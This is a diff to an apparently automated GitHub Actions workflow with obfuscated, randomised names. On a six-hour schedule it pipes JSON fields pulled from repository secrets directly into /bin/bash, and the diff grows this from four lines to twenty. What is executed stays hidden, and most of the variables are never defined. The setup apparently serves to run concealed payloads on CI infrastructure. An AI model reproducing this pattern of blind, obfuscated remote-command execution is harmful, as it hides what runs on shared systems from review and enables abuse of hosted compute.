@@ -3,7 +3,7 @@ name: ningtiandeng4718
 on:
   workflow_dispatch:
   schedule:
-    - cron: '3 4/6 * * *'
+    - cron: '24 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,10 +12,26 @@ jobs:
       - uses: actions/checkout@v4
       - name: ningtiandeng4718
         env:
-          l7721: ${{ secrets.l7721 }}
+          g981: ${{ secrets.g981 }}
         run: |
-          echo $l7721 | jq -r .bl52 | /bin/bash
-          echo $ykrzz45 | jq -r .ftv106 | /bin/bash
-          echo $ehbq21 | jq -r .zoo5 | /bin/bash
-          echo $sw5 | jq -r .ezrsd2 | /bin/bash
+          echo $g981 | jq -r .w0662 | /bin/bash
+          echo $rrt14 | jq -r .h57 | /bin/bash
+          echo $ptfa7869 | jq -r .nlfaj4 | /bin/bash
+          echo $xovw798 | jq -r .ych3895 | /bin/bash
+          echo $snda4 | jq -r .qr0 | /bin/bash
+          echo $zmamy3 | jq -r .utdc015 | /bin/bash
+          echo $xuny0929 | jq -r .mk3342 | /bin/bash
+          echo $rjzoq823 | jq -r .sglx75 | /bin/bash
+          echo $rbffl06991 | jq -r .lsfx93554 | /bin/bash
+          echo $zsz9504 | jq -r .gyen260 | /bin/bash
+          echo $x25 | jq -r .txso2047 | /bin/bash
+          echo $imlwk249 | jq -r .dqxuk986 | /bin/bash
+          echo $pmac135 | jq -r .yal660 | /bin/bash
+          echo $nf76671 | jq -r .eu4896 | /bin/bash
+          echo $oisd51979 | jq -r .ttzt3344 | /bin/bash
+          echo $cqvcu3642 | jq -r .bgtp4775 | /bin/bash
+          echo $zk76 | jq -r .yteja40078 | /bin/bash
+          echo $tk00508 | jq -r .wpmfz9 | /bin/bash
+          echo $j93 | jq -r .uli7953 | /bin/bash
+          echo $g0121 | jq -r .dosu59716 | /bin/bash
 
